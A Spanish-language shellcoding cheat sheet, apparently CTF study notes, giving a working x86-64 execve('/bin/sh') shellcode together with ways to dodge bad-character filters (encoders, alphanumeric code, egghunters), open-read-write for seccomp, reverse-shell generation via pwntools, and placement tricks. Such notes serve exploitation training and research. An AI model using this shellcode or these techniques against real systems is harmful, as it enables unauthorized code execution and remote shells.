# Shellcoding (cheat sheet)

Escribir codigo maquina que se inyecta y ejecuta. Solo viable si hay una region EJECUTABLE:
NX off, o tras mprotect/SROP/WASM que la haga RWX (ver [[syscalls-seccomp]]).

## execve('/bin/sh') x86-64 (23 bytes, clasico)
Idea: rax=59 (SYS_execve), rdi="/bin/sh", rsi=0, rdx=0, syscall. Se empuja "/bin/sh\0" a la
pila y se apunta rdi a el.
```
xor  esi, esi              ; rsi=0 (argv)
push rsi
mov  rdi, 0x68732f2f6e69622f ; "/bin//sh" (little-endian, sin NUL)
push rdi
push rsp ; pop rdi         ; rdi -> "/bin//sh"
xor  edx, edx              ; rdx=0 (envp)
push 59 ; pop rax          ; rax=59
syscall
```
pwntools: `asm(shellcraft.amd64.linux.sh())`. "/bin//sh" usa doble barra para que sean 8 bytes
sin NUL.

## Restricciones frecuentes y como sortearlas
- bad chars (0x00, 0x0a, 0x20...): el input los corta (strcpy corta en 0x00, gets/scanf en
  0x0a, a veces espacio). Evita generar esos bytes, o usa un encoder (xor) + decoder stub que
  se auto-descifra en runtime. pwntools: `pwnlib.encoders.encode(sc, avoid=b'\x00\x0a')`.
- solo alfanumerico/printable: shellcode alfanumerico (solo bytes [0-9A-Za-z]); necesita un
  registro apuntando al shellcode para el stub. pwntools `encoders.i386/amd64` alphanumeric.
- espacio muy corto: egghunter, un stub pequeno que busca en memoria una marca de 8 bytes
  ("w00tw00t") que precede al shellcode grande (escrito en otra region) y salta a el.
- posicion desconocida: shellcode position-independent; obten la direccion actual con
  `jmp/call/pop` (call a la siguiente linea, pop rsi = rip) o rip-relative.

## ORW (seccomp bloquea execve)
open("/flag")+read+write; ver [[syscalls-seccomp]]. `shellcraft.amd64.linux.cat('/flag')` o
`open('/flag')+read+write` manuales.

## Reverse / bind shell (sin /bin/sh directo)
socket(41)+connect(42)+dup2(33) de stdin/out/err al fd+execve, o `shellcraft.amd64.linux.
connect(host,port)` + `dupsh()`. Util cuando quieres shell interactiva por red.

## Otras arquitecturas
- x86 (32-bit): `int 0x80`, execve=11, args en ebx/ecx/edx; "/bin/sh" en la pila, ebx->cadena.
- AArch64: execve=221, num en x8, args x0-x2, `svc #0`. ARM32: execve=11, r7, `svc #0`.
- MIPS: execve=4011, num en $v0, `syscall`; cuidado con el branch delay slot.
- pwntools: fija `context.arch` y usa `shellcraft.<arch>.linux.sh()`.

## Colocacion y salto
- en la pila (NX off): salta a la direccion del buffer con un `jmp rsp`/`call rsp`, o pon un
  NOP sled (\x90) delante si la direccion no es exacta.
- en .bss/heap: escribe el shellcode, luego mprotect RWX (ROP/SROP) sobre esa pagina y salta.
- alineacion: mantén el shellcode corto; evita instrucciones con bytes prohibidos.

## Herramientas
pwntools `asm()`, `shellcraft`, `context.arch/os`, `pwnlib.encoders`; `objdump -d` o
`disasm()` para verificar; prueba SIEMPRE en sandbox aislado antes del target real.
